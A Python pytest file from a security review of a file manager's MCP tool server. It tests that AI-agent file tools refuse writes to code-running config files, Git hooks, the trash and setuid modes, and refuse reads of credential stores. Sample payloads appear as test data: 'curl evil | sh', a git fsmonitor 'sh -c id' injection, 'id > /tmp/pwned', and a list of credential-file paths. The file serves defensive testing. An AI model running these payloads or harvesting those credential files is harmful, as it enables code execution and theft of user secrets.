"""Round 6 security review: write default-deny, more secrets, the trash as a
confused deputy, archive members in protected places, MCP chmod modes.

* H1: MCP ``archive_extract`` checked only the new target folder, as a plain
  write: a target that is a missing parent of a protected place (``~/go``
  holding ``~/go/bin``) passed and the members landed in the place; no
  member was checked (``x/.git/config``, ``evil.pth``). The packer checked
  the archive's name after writing it, ``_place_new`` a new file as a plain
  write.
* M2: the write side listed places; dozens more run code (``~/.pdbrc``,
  ``~/.config/kitty``, ``~/.wezterm.lua``, GNOME Shell extensions, zsh files
  in ``$ZDOTDIR``, a project's ``.git/config``). Now every hidden entry of the
  home and every entry of ``~/.config``, ``~/.local/share``, ``~/.local/state``
  (``~/Library``, ``%APPDATA%``) is refused unless the user grants that
  folder, and Git's code-running files are refused anywhere. The agent
  sandbox mounts the hidden entries read-only and frames the home.
* M5: the read side missed most credential stores (AWS, gh, kube, docker,
  browsers, shell history, ...).
* M1: the trash (``~/.axross-trash``) was neither protected nor secret, and
  Restore / Undo put whatever its sidecars said wherever they said, with
  axross's rights.
* M6: MCP chmod accepted setuid, setgid, sticky and world-writable modes.
"""

from __future__ import annotations

import io
import json
import os
import stat
import sys
import zipfile
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from core import agent_sandbox as SB  # noqa: E402
from core import mcp_server as M  # noqa: E402
from core import protected_places as P  # noqa: E402
from core import trash as T  # noqa: E402
from core.local_fs import LocalFS  # noqa: E402

_HOST_PATH_ENV = "AXROSS_AGENT_HOST_PATH"


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    real = tmp_path / "home"
    (real / ".config").mkdir(parents=True)
    (real / "proj").mkdir()
    (real / "dl").mkdir()
    monkeypatch.setenv("HOME", str(real))
    for name in (P.HOST_HOME_ENV, _HOST_PATH_ENV, "ZDOTDIR", "APPDATA", "LOCALAPPDATA",
                 *(v for _p, v, _h in P.XDG_PLACES), *(h for _p, _v, h in P.XDG_PLACES)):
        monkeypatch.delenv(name, raising=False)
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    monkeypatch.setattr(P, "ZDOTDIR_SYSTEM_FILES", (), raising=False)
    # The sidecar key (core.extension_code_cache) of this home, not a cached one.
    from core import extension_code_cache as ECC

    monkeypatch.setattr(ECC, "_SECRET", [], raising=False)
    return real


def _tools(root, groups=None):
    kw = {"tool_groups": frozenset(groups)} if groups else {}
    return M._build_tools(LocalFS(), allow_write=True, root=str(root), **kw)


def _call(tools, name, args) -> str:
    """"ok" or "error: <message>" - a JSON-RPC error or an isError result."""
    resp = M._handle_request(
        {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
         "params": {"name": name, "arguments": args}},
        tools, cancels=M._CancelRegistry(), tasks=M._TaskRegistry())
    if "error" in resp:
        return "error: " + resp["error"]["message"]
    if resp["result"].get("isError"):
        return "error: " + json.dumps(resp["result"])
    return "ok"


def _plan(root: Path, writable: bool = True, extra=()) -> dict[str, tuple[bool, str]]:
    return {p: (rw, kind) for p, rw, kind in
            SB._mount_plan(SB.SandboxProfile(name="t"), str(root), writable, extra)}


# -- H1: archive members, the packer, new files ------------------------------------------

def _zip(path: Path, members: dict[str, bytes]) -> Path:
    with zipfile.ZipFile(path, "w") as z:
        for name, data in members.items():
            z.writestr(name, data)
    return path


def test_sad_extract_into_a_new_folder_that_holds_a_protected_place_is_refused(home):
    """go.zip extracted in the home: the new ~/go holds ~/go/bin (on PATH)."""
    archive = _zip(home / "dl" / "go.zip", {"bin/tool": b"#!/bin/sh\nid\n"})
    out = _call(_tools(home, {"archive"}), "archive_extract",
                {"path": str(archive), "dest_dir": str(home)})
    assert out.startswith("error")
    assert not (home / "go").exists()


@pytest.mark.parametrize("member", ["proj/.git/config", "proj/.git/hooks/post-checkout",
                                    "pkg/evil.pth", "x/.axross-trash/abc.meta.json"])
def test_sad_extract_refuses_a_member_in_a_protected_place(home, member):
    archive = _zip(home / "dl" / "bundle.zip", {"readme.txt": b"hi", member: b"[core]\n"})
    out = _call(_tools(home, {"archive"}), "archive_extract", {"path": str(archive)})
    assert out.startswith("error") and member.split("/")[-1] in out
    assert not (home / "dl" / "bundle").exists()  # nothing is left behind


def test_happy_extract_of_a_plain_archive_still_works(home):
    archive = _zip(home / "dl" / "docs.zip", {"a/b.txt": b"b", "c.txt": b"c"})
    assert _call(_tools(home, {"archive"}), "archive_extract", {"path": str(archive)}) == "ok"
    assert (home / "dl" / "docs" / "a" / "b.txt").read_bytes() == b"b"


def test_sad_pack_checks_the_archive_name_before_writing_it(home):
    """A hidden archive in the home (default-deny) was written, then refused."""
    (home / "proj" / "f.txt").write_text("x")
    out = _call(_tools(home, {"packer"}), "pack",
                {"folder": str(home), "names": ["proj"], "archive_name": ".bundle"})
    assert out.startswith("error")
    assert not [n for n in os.listdir(home) if n.startswith(".bundle")]


def test_sad_a_new_file_is_checked_as_an_entry(home):
    """metadata_export_file creating a FILE at ~/go (a missing folder that
    would hold ~/go/bin) - checked as a plain write, it passed."""
    (home / "proj" / "f.txt").write_text("x")
    out = _call(_tools(home, {"metadata"}), "metadata_export_file",
                {"path": str(home / "proj" / "f.txt"), "out": str(home / "go")})
    assert out.startswith("error")
    assert not (home / "go").exists()


# -- M2: write default-deny --------------------------------------------------------------

DENIED = [
    ".config/kitty/kitty.conf", ".config/vim/vimrc", ".config/starship.toml", ".wezterm.lua",
    ".config/direnv/direnvrc", ".local/share/gnome-shell/extensions/x@y/extension.js",
    ".config/dconf/user", ".local/share/kwin/scripts/x/main.js", ".config/kglobalshortcutsrc",
    ".config/Thunar/uca.xml", ".jupyter/jupyter_server_config.py", ".pdbrc", ".irbrc",
    ".Rprofile", ".psqlrc", ".hgrc", ".lessfilter", ".bashrc.local", ".aliases",
    ".gitconfig.local", ".zshrc.d/x.zsh", ".profile.d/x.sh",
    "Library/Application Support/iTerm2/Scripts/AutoLaunch/x.py",
    "AppData/Roaming/Microsoft/Windows/Start Menu/x.lnk",
]


@pytest.mark.parametrize("rel", DENIED)
def test_sad_hidden_and_settings_entries_are_refused_for_writes(home, rel):
    (home / rel).parent.mkdir(parents=True, exist_ok=True)  # only the file is refused
    tools = _tools(home)
    out = _call(tools, "write_file", {"path": str(home / rel), "content": "payload"})
    assert out.startswith("error"), rel
    assert not (home / rel).exists()


@pytest.mark.parametrize("rel", ["proj/.git/config", "proj/.git/hooks/pre-commit",
                                 "proj/.git/info/attributes", "proj/.gitmodules",
                                 "proj/sub/.git/modules/m/config", "proj/.git"])
def test_sad_git_files_that_run_code_are_refused_anywhere(home, rel):
    (home / "proj" / ".git").mkdir()
    assert P.refusal(str(home / rel), granted=[str(home / "proj")])
    if not rel.endswith(".git"):
        out = _call(_tools(home / "proj"), "write_file",
                    {"path": str(home / rel), "content": "[core]\n\tfsmonitor = sh -c id\n"})
        assert out.startswith("error")


def test_sad_a_folder_renamed_to_dot_git_is_refused(home):
    (home / "proj" / "x").mkdir()
    (home / "proj" / "x" / "config").write_text("[core]\n")
    out = _call(_tools(home / "proj"), "rename",
                {"src": str(home / "proj" / "x"), "dst": str(home / "proj" / ".git")})
    assert out.startswith("error")
    assert not (home / "proj" / ".git").exists()


def test_happy_a_granted_hidden_folder_is_writable_below_it(home):
    (home / ".myproj").mkdir()
    assert _call(_tools(home / ".myproj"), "write_file",
                 {"path": str(home / ".myproj" / "notes.txt"), "content": "x"}) == "ok"
    # ... but not through the home as the root (no grant of that folder) ...
    assert _call(_tools(home), "write_file",
                 {"path": str(home / ".myproj" / "more.txt"), "content": "x"}).startswith("error")
    # ... and the listed places and Git's files stay refused in a grant.
    assert P.refusal(str(home / ".myproj" / ".git" / "config"), granted=[str(home / ".myproj")])
    assert P.refusal(str(home / ".config" / "autostart" / "x.desktop"),
                     granted=[str(home / ".config")])


def test_happy_ordinary_files_stay_writable(home):
    tools = _tools(home)
    (home / "proj" / ".github" / "workflows").mkdir(parents=True)
    for rel in ("notes.txt", "proj/a.txt", "proj/.env.example", "proj/.github/workflows/x.yml"):
        assert _call(tools, "write_file", {"path": str(home / rel), "content": "x"}) == "ok", rel


def test_edge_granting_the_home_lifts_nothing(home):
    assert P.refusal(str(home / ".pdbrc"), granted=[str(home)])
    assert P.refusal(str(home / ".pdbrc"), granted=["/"])


@pytest.mark.parametrize("line, folder", [
    ('export ZDOTDIR="$HOME/zsh"', "zsh"),
    ("ZDOTDIR=~/dotfiles/zsh", "dotfiles/zsh"),
    ('export ZDOTDIR="${XDG_CONFIG_HOME:-$HOME/.config}/zsh"', ".config/zsh"),
])
def test_sad_zsh_start_files_in_zdotdir_are_protected(home, line, folder):
    (home / ".zshenv").write_text(f"# zsh\n{line}\n")
    target = home / folder / ".zshrc"
    assert P.refusal(str(target), granted=[str(home / folder)])
    assert P.refusal(str(home / folder / "notes.txt"), granted=[str(home / folder)]) is None


def test_sad_the_sandbox_mounts_hidden_entries_read_only_and_frames_the_home(home):
    (home / ".pdbrc").write_text("import os\n")
    (home / ".jupyter").mkdir()
    (home / "notes.txt").write_text("mine\n")
    plan = _plan(home)
    assert plan[str(home / ".pdbrc")] == (False, "bind")
    assert plan[str(home / ".jupyter")] == (False, "bind")
    assert plan[str(home / ".config")] == (False, "bind")
    assert plan[str(home)] == (False, "frame")  # no new hidden entry can be made
    assert plan[str(home / "notes.txt")] == (True, "entry")
    assert plan[str(home / "proj")] == (True, "entry")


def test_happy_the_sandbox_keeps_a_granted_settings_folder_writable(home):
    (home / ".config" / "myapp").mkdir()
    plan = _plan(home / ".config" / "myapp")
    assert plan[str(home / ".config" / "myapp")] == (True, "bind")
    (home / ".myproj").mkdir()
    assert _plan(home / ".myproj")[str(home / ".myproj")] == (True, "bind")


def test_sad_the_sandbox_mounts_the_roots_git_config_and_hooks_read_only(home):
    git = home / "proj" / ".git"
    (git / "hooks").mkdir(parents=True)
    (git / "config").write_text("[core]\n")
    (home / "proj" / ".gitmodules").write_text("")
    plan = _plan(home / "proj")
    assert plan[str(git / "config")] == (False, "bind")
    assert plan[str(git / "hooks")] == (False, "bind")
    assert plan[str(git / "info")] == (False, "dir")  # missing: an empty read-only one
    assert plan[str(home / "proj" / ".gitmodules")] == (False, "bind")
    assert plan[str(home / "proj")] == (True, "bind")


# -- M5: secrets --------------------------------------------------------------------------

SECRETS = [
    ".aws/credentials", ".config/gh/hosts.yml", ".kube/config", ".docker/config.json",
    ".config/gcloud/application_default_credentials.json", ".azure/msal_token_cache.json",
    ".pypirc", ".npmrc", ".cargo/credentials.toml", ".config/rclone/rclone.conf",
    ".vault-token", ".terraform.d/credentials.tfrc.json", ".claude/.credentials.json",
    ".config/hub", ".mozilla/firefox/x.default/key4.db",
    ".config/google-chrome/Default/Cookies", ".thunderbird/x.default/logins.json",
    ".bash_history", ".local/share/fish/fish_history", ".password-store/.gpg-id",
    ".config/Signal/config.json",
    # by name below a hidden folder of the home
    ".somecli/api_token.json", ".local/share/x/cookies.sqlite", ".foo/id_work",
    ".foo/server.pem", ".foo/vault.kdbx", ".python_history", ".cache/huggingface/token",
    "Library/Application Support/Google/Chrome/Default/Login Data",
]


@pytest.mark.parametrize("rel", SECRETS)
def test_sad_credential_stores_are_secret(home, rel):
    path = home / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("SECRET")
    assert P.read_refusal(str(path)), rel
    tools = M._build_tools(LocalFS(), allow_write=False, root=str(home))
    assert _call(tools, "read_file", {"path": str(path)}).startswith("error"), rel


@pytest.mark.parametrize("rel", [
    "proj/token.txt", ".foo/readme.txt", "notes_history.txt", ".config/kitty/kitty.conf",
    # code under hidden folders: a Python's stdlib, packages named like secrets
    ".pyenv/versions/3.11.2/lib/python3.11/tokenize.py",
    ".pyenv/versions/3.11.2/lib/python3.11/secrets.py",
    ".local/lib/python3.11/site-packages/secretstorage/__init__.py",
    ".local/lib/python3.11/site-packages/google/auth/credentials.py",
])
def test_edge_ordinary_files_stay_readable(home, rel):
    # Round 7: a hidden folder of the home is default-deny for reads unless
    # granted; granted, its files are not taken for secrets by their names.
    path = home / rel
    assert P.read_refusal(str(path), granted=[str(path.parent)]) is None


def test_edge_the_sandbox_leaves_code_named_like_secrets_alone(home):
    stdlib = home / ".pyenv" / "versions" / "3.11.2" / "lib" / "python3.11"
    stdlib.mkdir(parents=True)
    (stdlib / "tokenize.py").write_text("# stdlib\n")
    package = home / ".local" / "lib" / "python3.11" / "site-packages" / "tokenizers"
    package.mkdir(parents=True)
    (package / "token_data.json").write_text("{}")
    hidden = {path for path, _folder in P.secret_hides()}
    assert str(stdlib / "tokenize.py") not in hidden
    assert str(package / "token_data.json") not in hidden  # site-packages is not walked


def test_sad_the_sandbox_covers_credential_stores_and_named_secrets(home):
    for rel in (".aws/credentials", ".somecli/api_token.json", ".bash_history"):
        (home / rel).parent.mkdir(parents=True, exist_ok=True)
        (home / rel).write_text("SECRET")
    (home / ".somecli" / "settings.json").write_text("{}")
    plan = _plan(home)
    assert plan[str(home / ".aws")] == (False, "dir")
    assert plan[str(home / ".somecli" / "api_token.json")] == (False, "hide")
    assert plan[str(home / ".bash_history")] == (False, "hide")
    assert str(home / ".somecli" / "settings.json") not in plan


# -- M1: the trash ------------------------------------------------------------------------

def _plant(home: Path, original: str, data: str, **extra) -> str:
    """What an agent (or a subverted sandbox worker) writes into the trash."""
    trash = home / T.TRASH_DIRNAME
    trash.mkdir(exist_ok=True)
    tid = "0123456789abcdef0123456789abcdef"
    (trash / tid).write_text(data)
    (trash / f"{tid}{T.META_SUFFIX}").write_text(json.dumps(
        {"trash_id": tid, "original_path": original, "trashed_at": "2026-11-09T10:00:00",
         "size": len(data), "is_dir": False, "label": "report", **extra}))
    return tid


@pytest.mark.parametrize("rel", [".bash_profile", ".config/autostart/sync.desktop"])
def test_sad_a_planted_trash_entry_is_not_restored_into_a_protected_place(home, rel):
    tid = _plant(home, str(home / rel), "id > /tmp/pwned\n")
    for allow in (False, True):  # not even when the user confirms: not authenticated
        with pytest.raises(T.ProtectedRestoreError) as err:
            T.restore(LocalFS(), tid, allow_protected=allow)
        assert not err.value.verified
    assert not (home / rel).exists()


def test_sad_a_forged_sidecar_is_refused(home):
    tid = _plant(home, str(home / "proj" / "report.txt"), "x", mac="0" * 64)
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid)
    assert not (home / "proj" / "report.txt").exists()


def test_sad_data_changed_in_the_trash_is_not_restored(home):
    """The user trashes a file; its data is rewritten in the trash; Restore
    (or Ctrl+Z, which calls restore with the original path) refuses it."""
    victim = home / "proj" / "run.sh"
    victim.write_text("echo hello\n")
    tid = T.trash(LocalFS(), str(victim))
    (home / T.TRASH_DIRNAME / tid).write_text("curl evil | sh\n")
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid)
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid, target=str(victim))
    assert not victim.exists()


def test_sad_a_changed_trashed_folder_is_not_restored(home):
    folder = home / "proj" / "site"
    (folder / "js").mkdir(parents=True)
    (folder / "js" / "app.js").write_text("ok()\n")
    tid = T.trash(LocalFS(), str(folder))
    (home / T.TRASH_DIRNAME / tid / "js" / "app.js").write_text("evil()\n")
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid)


def test_happy_a_trashed_start_file_comes_back_once_the_user_confirms(home):
    (home / ".bashrc").write_text("# mine\n")
    tid = T.trash(LocalFS(), str(home / ".bashrc"))
    with pytest.raises(T.ProtectedRestoreError) as err:
        T.restore(LocalFS(), tid)
    assert err.value.verified
    assert T.restore(LocalFS(), tid, allow_protected=True) == str(home / ".bashrc")
    assert (home / ".bashrc").read_text() == "# mine\n"


def test_happy_restore_of_ordinary_and_older_entries_still_works(home):
    doc = home / "proj" / "doc.txt"
    doc.write_text("text\n")
    tid = T.trash(LocalFS(), str(doc))
    meta = json.loads((home / T.TRASH_DIRNAME / f"{tid}{T.META_SUFFIX}").read_text())
    assert "mac" in meta and meta["fingerprint"]["kind"] == "file"
    assert T.restore(LocalFS(), tid) == str(doc)
    # An entry from before authenticated sidecars: restored outside protected places.
    old = _plant(home, str(home / "proj" / "old.txt"), "old\n")
    assert T.restore(LocalFS(), old) == str(home / "proj" / "old.txt")


def test_sad_tools_neither_read_nor_write_the_trash(home):
    (home / ".ssh").mkdir()
    (home / ".ssh" / "id_old").write_text("KEY")
    tid = T.trash(LocalFS(), str(home / ".ssh" / "id_old"))
    data = home / T.TRASH_DIRNAME / tid
    tools = _tools(home)
    assert _call(tools, "read_file", {"path": str(data)}).startswith("error")
    assert _call(tools, "write_file", {"path": str(data), "content": "x"}).startswith("error")
    assert data.read_text() == "KEY"
    # A trash folder anywhere (a dedupe trash in the root): the same.
    (home / "proj" / T.TRASH_DIRNAME).mkdir()
    proj_tools = _tools(home / "proj")
    out = _call(proj_tools, "write_file",
                {"path": str(home / "proj" / T.TRASH_DIRNAME / "x.meta.json"), "content": "{}"})
    assert out.startswith("error")


def test_happy_mcp_dedupe_still_moves_copies_to_the_roots_trash(home):
    """No tool writes into the trash any more; duplicates_dedupe still moves
    a copy there (core.trash does, signed)."""
    root = home / "proj"
    for name in ("a.txt", "b.txt"):
        (root / name).write_text("same content\n")
    tools = _tools(root, {"duplicates"})
    assert _call(tools, "duplicates_scan", {"path": str(root)}) == "ok"
    out = _call(tools, "duplicates_dedupe", {"path": str(root), "dry_run": False})
    assert out == "ok", out
    assert len([n for n in os.listdir(root) if n.endswith(".txt")]) == 1
    entries = T.list_trash(LocalFS(), root=str(root / T.TRASH_DIRNAME))
    assert len(entries) == 1


# -- M6: chmod ----------------------------------------------------------------------------

@pytest.mark.parametrize("mode", ["4755", "2755", "0o6777", "1777", "777", "775", "0o4700",
                                  "666"])
def test_sad_chmod_refuses_setuid_setgid_sticky_and_shared_write(home, mode):
    target = home / "proj" / "tool"
    target.write_text("#!/bin/sh\n")
    os.chmod(target, 0o644)
    out = _call(_tools(home), "chmod", {"path": str(target), "mode": mode})
    assert out.startswith("error") and "setuid" in out
    assert stat.S_IMODE(os.stat(target).st_mode) == 0o644


@pytest.mark.parametrize("mode, expected", [("755", 0o755), ("0o700", 0o700), ("644", 0o644),
                                            ("600", 0o600)])
def test_happy_chmod_of_ordinary_modes_still_works(home, mode, expected):
    target = home / "proj" / "tool"
    target.write_text("#!/bin/sh\n")
    assert _call(_tools(home), "chmod", {"path": str(target), "mode": mode}) == "ok"
    assert stat.S_IMODE(os.stat(target).st_mode) == expected


def test_edge_zip_helper_is_a_real_archive(tmp_path):
    archive = _zip(tmp_path / "x.zip", {"a": b"1"})
    with zipfile.ZipFile(io.BytesIO(archive.read_bytes())) as z:
        assert z.namelist() == ["a"]
